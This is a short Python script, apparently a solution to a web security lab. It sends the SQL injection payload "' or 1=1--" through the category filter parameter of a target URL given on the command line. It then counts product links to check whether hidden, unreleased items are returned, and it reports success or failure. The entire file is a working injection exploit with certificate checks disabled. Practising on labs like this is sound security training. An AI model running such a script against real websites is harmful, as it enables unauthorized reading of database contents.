#! /usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_01(url, payload):

    uri = '/filter?category='

    normal = requests.get(url + uri + "Gifts", verify=False)
    normal_items = normal.text.count('href="/product?productId=')

    r = requests.get(url + uri + payload, verify=False)
    items = r.text.count('href="/product?productId=')

    print(f"[+] Normal released items: {normal_items}")
    print(f"[+] Released and unreleased items: {items}")

    return items > normal_items


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = "' or 1=1--"
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()

    if sqli_01(url, payload):
        print("[+] SQLi successful, all items returned")
    else:
        print("[-] SQLi unsuccessful :(")        